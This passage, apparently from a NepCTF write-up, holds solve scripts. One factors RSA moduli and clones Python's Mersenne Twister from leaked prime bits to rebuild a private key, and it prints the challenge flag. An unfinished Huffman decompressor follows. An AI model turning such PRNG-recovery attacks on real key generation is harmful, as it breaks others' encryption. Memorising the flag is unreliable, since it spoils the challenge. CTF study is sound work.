class=mi>1759705311888599121762237683674602601562650019215281100524297889958864098890456808890567814946281864858777143847204033988242078715345997577387282150134991846644101889785033783723962236449982717217935056824299870198862681740351400132360278327629947500319487627494525224941987142794473777953354286259</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>4745038347896076947673271938461385318794079766359529504976524646896294868332047751089985870725130328002355874927653753023531920178028251634001134203131121394768936024369661969049291674944945068481964620881625571330581475029752830170375799087480677816070627536124277872889134518120471673961875243133</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>11038122233753291943671884140754316997316569324294307752770057002670866443971599721095354697989126123957462677312559907063896358298435338268616203070722948799041132297418328068593545914067297819523408376155165079007564357377831753506450057285716167692167943137018723740926059682996095072469923135747</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>32167409752229959730450516334251032219525613651221452545810628137013019074856611786859747245276852892390695097435257804939343197003368183350732726108474784920872062856352989555612009356708498404069832839408964507375467974299535891360377321099310624341474795506125064074646641475877373055372149915887</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># # 求p和q</span>
</span></span><span class=line><span class=cl><span class=c1># def divide_pq(e, d, n):</span>
</span></span><span class=line><span class=cl><span class=c1>#     k = e*d - 1</span>
</span></span><span class=line><span class=cl><span class=c1>#     while True:</span>
</span></span><span class=line><span class=cl><span class=c1>#         g = randint(2, n-1)</span>
</span></span><span class=line><span class=cl><span class=c1>#         t = k</span>
</span></span><span class=line><span class=cl><span class=c1>#         while True:</span>
</span></span><span class=line><span class=cl><span class=c1>#             if t % 2 != 0:</span>
</span></span><span class=line><span class=cl><span class=c1>#                 break</span>
</span></span><span class=line><span class=cl><span class=c1>#             t //= 2</span>
</span></span><span class=line><span class=cl><span class=c1>#             x = pow(g, t, n)</span>
</span></span><span class=line><span class=cl><span class=c1>#             if x &gt; 1 and gmpy2.gcd(x-1, n) &gt; 1:</span>
</span></span><span class=line><span class=cl><span class=c1>#                 p = gmpy2.gcd(x-1, n)</span>
</span></span><span class=line><span class=cl><span class=c1>#                 return (p, n//p)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># p = []</span>
</span></span><span class=line><span class=cl><span class=c1># q = []</span>
</span></span><span class=line><span class=cl><span class=c1># for i in range(7):</span>
</span></span><span class=line><span class=cl><span class=c1>#     p1, q1 = divide_pq(e[i], d[i], N[i])</span>
</span></span><span class=line><span class=cl><span class=c1>#     if p1&gt;q1:</span>
</span></span><span class=line><span class=cl><span class=c1>#         p.append(p1)</span>
</span></span><span class=line><span class=cl><span class=c1>#         q.append(q1)</span>
</span></span><span class=line><span class=cl><span class=c1>#     else:</span>
</span></span><span class=line><span class=cl><span class=c1>#         p.append(q1)</span>
</span></span><span class=line><span class=cl><span class=c1>#         q.append(p1)</span>
</span></span><span class=line><span class=cl><span class=c1># print(q)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=p>[</span><span class=n>mpz</span><span class=p>(</span><span class=mi>140355873796694909576431368874747339716301577234207192107779910045180090775820104686212432122292759964501347042349813301102243869077809148734909053298280796801907415519833043345228842785278399224087738271827349964000804168656623756169777278420160336931932476969311660479486045324099781333314965811813578441579</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>102212700979895510648623555577023610343644858959390802474003737860443963874892700208480174819660422583260196988057411912829301448776738644713817224989060861390307267204321995745224174824955195487251717187109167284400424778883589047586284499614791123748564578480091206236116565301422341513241598776475318747887</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>88989134949168404891168460329276009358034218952518202630480219080345007117326874396070053925826874519266118649702946670000368708749767080333383599537822438831858755527000016586892456793416386990311711539597584582871258141176880718936728664803607811403479024642917211873268923282927720764642522527655740309693</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>17086801723189843104884738808293129261528620712802079055076000994113691145662556838106922657376532601557062463278181051840750401595764731335811547940186263905922788548639633859399061010012617671977290161330249975225253723745726161023714094418766302279513372835527091020329450356093480371459439315300082778523</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>137457475866518792791178005431551103959617632938207923781080925963780520574551227868483481292949306056035420184880346674082378788818946173194579648901048347218278346295019211137588959832185168338941079193346320111722638145999101523537812944201745207699426710612151520590600645330025117084877140503961402343531</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>31629809179435885325000301466637904123821239728370267403120049060600199791165159929844336211467567875500257503733738038891664780702125202435606696853347849462601880425374169201338727807366915200032331813846449468332717403998836477651440754410069352816017276179194882323661619403338731942973591609663744379483</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>162652988860653932443281627685807699340953776193387080349470097777444222315963944629621803158832625137787268219312599555461918869427218066977627981903574394692945111392748742979374138435664675189771808930796155018579350001228249226194695654823829477623997582903571299555653901134826357542332682812187002013029</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=p>[</span><span class=n>mpz</span><span class=p>(</span><span class=mi>62682455137368252114518658082028724021017753307955596332070466109739554389948087687756863609891321803711731304375789766126108919319251598444161000605397747508444667575378703848704234746059269393829577964919232275490136378181171806248272574229659248830005050558614194941189359409154597105971377703201485619467</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>98211271514641176929730295801784273300562909676818931678280464097365712697496181930081611267165697834838813255538768394227516512657806037800228237729351859151726301005470435354084068058706078313176420850194900021738678229235140728827605262419600253555958288223604393371899911767489704505478987788866715386981</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>21662391395420280166740175480830143438278106219095826236536229724954935471443049488123086205835387533188134385535238197653840886831817384892874615428592228525653862303647979302062905819635881751242094470343721349777525677271607527792252793619435665458272566816763068177360342423202997406515173279056925820337</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>4537341409250667993055509863597005800659859052951029179643556245743043023869180963184574829576418433699503094768535226827820107726451927086337443576427708149258611616298552623039533868319950284995290419536057599132668527014944287736389987330730893938602327550026834248972473577007180319039176540757889647273</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>17101645335232420362316808849341972439011670869997941027656912854636786788374521620917453084783826531982204794388878203189259315579422668809695374812348284436574617148644448673083616587188062793664827604275080576192580458858474540962299030490882035233379265033684165960007067086545922166955882246304501334121</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>4773992627409140467710205320463834645445609201128355807754030326688160805727857494208904266095858863231047889061591468912477771937280690199107230937236480754396064061207943851853943227091660435533307296695467311196391292339797297650862828745116360278900808609786911055625060834167547345664257043862499885161</span><span class=p>),</span> <span class=n>mpz</span><span class=p>(</span><span class=mi>25039746668789538711022484062672936719669039080928488880580313285977264799539589019960818824199318929448263883466562042416069902030046160446677190304557745773069254708013576963304806269489062098992927783341071012515815329120160329349552393113597692254949677199226537292525453893898882519030793322718994366669</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 随机数预测</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_private_key</span><span class=p>(</span><span class=n>bits</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>,</span> <span class=n>q</span> <span class=o>=</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>bits</span><span class=p>),</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span><span class=p>,</span> <span class=n>phi</span> <span class=o>=</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span><span class=p>,</span> <span class=n>lcm</span><span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=mh>0x10001</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>privateKey</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>construct</span><span class=p>((</span><span class=nb>int</span><span class=p>(</span><span class=n>n</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=mh>0x10001</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>d</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>q</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>privateKey</span><span class=p>,</span> <span class=n>p</span> <span class=o>&gt;</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invert_right</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=n>l</span><span class=p>,</span><span class=n>val</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>mx</span> <span class=o>=</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>val</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=n>mx</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=p>,</span><span class=n>res</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span><span class=o>*</span><span class=n>l</span><span class=o>&lt;</span><span class=n>length</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mask</span> <span class=o>=</span> <span class=p>(</span><span class=n>mx</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>length</span><span class=o>-</span><span class=n>l</span><span class=p>)</span><span class=o>&amp;</span><span class=n>mx</span><span class=p>)</span><span class=o>&gt;&gt;</span><span class=n>i</span><span class=o>*</span><span class=n>l</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>m</span> <span class=o>&amp;</span> <span class=n>mask</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>=</span> <span class=n>m</span><span class=o>^</span><span class=n>tmp</span><span class=o>&gt;&gt;</span><span class=n>l</span><span class=o>&amp;</span><span class=n>val</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>+=</span> <span class=n>tmp</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invert_left</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=n>l</span><span class=p>,</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>mx</span> <span class=o>=</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=p>,</span><span class=n>res</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span><span class=o>*</span><span class=n>l</span> <span class=o>&lt;</span> <span class=n>length</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mask</span> <span class=o>=</span> <span class=p>(</span><span class=n>mx</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>length</span><span class=o>-</span><span class=n>l</span><span class=p>)</span><span class=o>&amp;</span><span class=n>mx</span><span class=p>)</span><span class=o>&lt;&lt;</span><span class=n>i</span><span class=o>*</span><span class=n>l</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>m</span> <span class=o>&amp;</span> <span class=n>mask</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>^=</span> <span class=n>tmp</span><span class=o>&lt;&lt;</span><span class=n>l</span><span class=o>&amp;</span><span class=n>val</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>|=</span> <span class=n>tmp</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invert_temper</span><span class=p>(</span><span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>invert_right</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=mi>18</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>invert_left</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>4022730752</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>invert_left</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>2636928640</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>invert_right</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=mi>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>clone_mt</span><span class=p>(</span><span class=n>record</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=p>[</span><span class=n>invert_temper</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>record</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>gen</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>Random</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>gen</span><span class=o>.</span><span class=n>setstate</span><span class=p>((</span><span class=mi>3</span><span class=p>,</span><span class=nb>tuple</span><span class=p>(</span><span class=n>state</span><span class=o>+</span><span class=p>[</span><span class=mi>0</span><span class=p>]),</span><span class=kc>None</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>gen</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>=</span>  <span class=n>p</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>q</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>d</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prng</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>31</span><span class=p>):</span>
</span></span><span class=line><span class=cl>         <span class=n>prng</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>&amp;</span><span class=p>(</span><span class=mh>0xffffffff</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>         <span class=n>p</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>=</span><span class=n>p</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>&gt;&gt;</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>31</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>prng</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>q</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mh>0xffffffff</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>q</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>q</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>30</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>prng</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>d</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mh>0xffffffff</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>d</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>d</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>g</span> <span class=o>=</span> <span class=n>clone_mt</span><span class=p>(</span><span class=n>prng</span><span class=p>[:</span><span class=mi>624</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 解密</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_prime</span><span class=p>(</span><span class=n>bits</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=p>(</span><span class=n>g</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=n>bits</span> <span class=o>-</span> <span class=mi>32</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>next_prime</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_private_key</span><span class=p>(</span><span class=n>bits</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>,</span> <span class=n>q</span> <span class=o>=</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>bits</span><span class=p>),</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span><span class=p>,</span> <span class=n>phi</span> <span class=o>=</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span><span class=p>,</span> <span class=n>lcm</span><span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=mh>0x10001</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>privateKey</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>construct</span><span class=p>((</span><span class=nb>int</span><span class=p>(</span><span class=n>n</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=mh>0x10001</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>d</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>q</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>privateKey</span><span class=p>,</span> <span class=n>p</span> <span class=o>&gt;</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>global_bits</span> <span class=o>=</span> <span class=mi>1024</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>,</span> <span class=n>q</span> <span class=o>=</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>global_bits</span><span class=p>),</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>global_bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>N</span> <span class=o>=</span> <span class=n>p</span><span class=o>*</span><span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>generate_prime</span><span class=p>(</span><span class=n>global_bits</span><span class=o>-</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>e</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=p>(</span><span class=n>p</span> <span class=o>*</span> <span class=n>p</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>q</span> <span class=o>*</span> <span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>privateKey</span><span class=p>,</span> <span class=n>signal</span> <span class=o>=</span> <span class=n>generate_private_key</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>decipher</span> <span class=o>=</span> <span class=n>PKCS1_v1_5</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>privateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=n>decipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>sentinel</span><span class=o>=</span><span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># b&#39;NepCTF{c4e4356067fb3bedc53dde7af59beb1c}&#39;</span>
</span></span></code></pre></div><h2 id=misc>Misc</h2><h3 id=与ai共舞的哈夫曼><strong>与AI共舞的哈夫曼</strong></h3><p>chatgpt写个解压缩脚本</p><p>exp.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>heapq</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gzip</span> <span class=kn>import</span> <span class=n>decompress</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>HuffmanNode</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>char</span><span class=p>,</span> <span class=n>freq</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>char</span> <span class=o>=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>freq</span> <span class=o>=</span> <span class=n>freq</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>left</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>right</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__lt__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>other</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>freq</span> <span class=o>&lt;</span> <span class=n>other</span><span class=o>.</span><span class=n>freq</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_huffman_tree</span><span class=p>(</span><span class=n>frequencies</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>heap</span> <span class=o>=</span> <span class=p>[</span><span class=n>HuffmanNode</span><span class=p>(</span><span class=n>char</span><span class=p>,</span> <span class=n>freq</span><span class=p>)</span> <span class=k>for</span> <span class=n>char</span><span class=p>,</span> <span class=n>freq</span> <span class=ow>in</span> <span class=n>frequencies</span><span class=o>.</span><span class=n>items</span><span class=p>()]</span>
</span></span><span class=line><span class=cl>    <span class=n>heapq</span><span class=o>.</span><span class=n>heapify</span><span class=p>(</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>heap</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>left</span> <span class=o>=</span> <span class=n>heapq</span><span class=o>.</span><span class=n>heappop</span><span class=p>(</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>right</span> <span class=o>=</span> <span class=n>heapq</span><span class=o>.</span><span class=n>heappop</span><span class=p>(</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>merged</span> <span class=o>=</span> <span class=n>HuffmanNode</span><span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=n>left</span><span class=o>.</span><span class=n>freq</span> <span class=o>+</span> <span class=n>right</span><span class=o>.</span><span class=n>freq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>merged</span><span class=o>.</span><span class=n>left</span> <span class=o>=</span> <span class=n>left</span>
</span></span><span class=line><span class=cl>        <span class=n>merged</span><span class=o>.</span><span class=n>right</span> <span class=o>=</span> <span class=n>right</span>
</span></span><span class=line><span class=cl>        <span class=n>heapq</span><span class=o>.</span><span class=n>heappush</span><span class=p>(</span><span class=n>heap</span><span class=p>,</span> <span class=n>merged</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>heap</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_huffman_codes</span><span class=p>(</span><span class=n>node</span><span class=p>,</span> <span class=n>current_code</span><span class=p>,</span> <span class=n>huffman_codes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>node</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>node</span><span class=o>.</span><span class=n>char</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>huffman_codes</span><span class=p>[</span><span class=n>node</span><span class=o>.</span><span class=n>char</span><span class=p>]</span> <span class=o>=</span> <span class=n>current_code</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>build_huffman_codes</span><span class=p>(</span><span class=n>node</span><span class=o>.</span><span class=n>left</span><span class=p>,</span> <span class=n>current_code</span> <span class=o>+</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=n>huffman_codes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>build_huffman_codes</span><span class=p>(</span><span class=n>node</span><span class=o>.</span><span class=n>right</span><span class=p>,</span> <span class=n>current_code</span> <span class=o>+</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=n>huffman_codes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decompress</span><span class=p>(</span><span class=n>input_file</span><span class=p>,</span> <span class=n>output_file</span><span class=p>):</span>
